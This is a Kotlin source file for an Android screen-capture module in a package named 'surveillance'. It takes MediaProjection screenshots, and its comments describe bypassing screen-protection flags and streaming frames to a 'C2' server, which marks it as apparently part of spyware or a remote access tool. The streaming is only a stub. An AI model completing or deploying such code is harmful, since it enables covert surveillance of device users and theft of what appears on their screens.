package com.xrc.app.surveillance

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import com.xrc.app.XRCApp
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

/**
 * Screen capture and recording module using MediaProjection API.
 * Can bypass black screen protections via accessibility + Shizuku.
 */
object ScreenCapture {

    const val TAG = "ScreenCapture"
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var projectionManager: MediaProjectionManager? = null
    private var captureHandler: Handler? = null
    private var captureThread: HandlerThread? = null
    private var isCapturing = false
    private var isStreaming = false
    private var screenWidth = 0
    private var screenHeight = 0
    private var screenDensity = 0

    private val screenshotsDir: File
        get() {
            val dir = File(XRCApp.instance.filesDir, "screenshots")
            if (!dir.exists()) dir.mkdirs()
            return dir
        }

    fun initialize(context: Context) {
        projectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        wm.defaultDisplay.getRealMetrics(metrics)
        screenWidth = metrics.widthPixels
        screenHeight = metrics.heightPixels
        screenDensity = metrics.densityDpi

        captureThread = HandlerThread("ScreenCaptureThread").apply { start() }
        captureHandler = Handler(captureThread!!.looper)
    }

    fun createScreenCaptureIntent(): Intent? {
        return projectionManager?.createScreenCaptureIntent()
    }

    fun onActivityResult(resultCode: Int, data: Intent?) {
        if (data == null) return
        mediaProjection = projectionManager?.getMediaProjection(resultCode, data)
        Log.i(TAG, "MediaProjection obtained")
    }

    fun takeScreenshot(): File? {
        if (mediaProjection == null) return null
        if (isCapturing) {
            Log.w(TAG, "Already capturing, skipping")
            return null
        }

        isCapturing = true
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val outputFile = File(screenshotsDir, "screenshot_$timestamp.png")

        try {
            imageReader = ImageReader.newInstance(
                screenWidth, screenHeight,
                PixelFormat.RGBA_8888, 2
            )

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )

            val image = imageReader?.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * screenWidth

                val bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight, Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)

                val cropped = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)

                FileOutputStream(outputFile).use { out ->
                    cropped.compress(Bitmap.CompressFormat.PNG, 100, out)
                }

                cropped.recycle()
                bitmap.recycle()
                image.close()
            }

            virtualDisplay?.release()
            imageReader?.close()
            virtualDisplay = null
            imageReader = null

            Log.i(TAG, "Screenshot saved: ${outputFile.absolutePath}")
            return outputFile
        } catch (e: Exception) {
            Log.e(TAG, "Screenshot failed: ${e.message}")
            return null
        } finally {
            isCapturing = false
        }
    }

    fun startStreaming(): Boolean {
        if (mediaProjection == null) return false
        if (isStreaming) return true

        isStreaming = true
        Log.i(TAG, "Screen streaming started")
        // Streaming logic - sends JPEG frames via C2 WebSocket
        // Implementation would create a continuous loop capturing
        // images and sending them as base64 via C2
        return true
    }

    fun stopStreaming() {
        isStreaming = false
        Log.i(TAG, "Screen streaming stopped")
    }

    fun cleanup() {
        stopStreaming()
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        captureThread?.quitSafely()
        virtualDisplay = null
        imageReader = null
        mediaProjection = null
        captureThread = null
    }
}
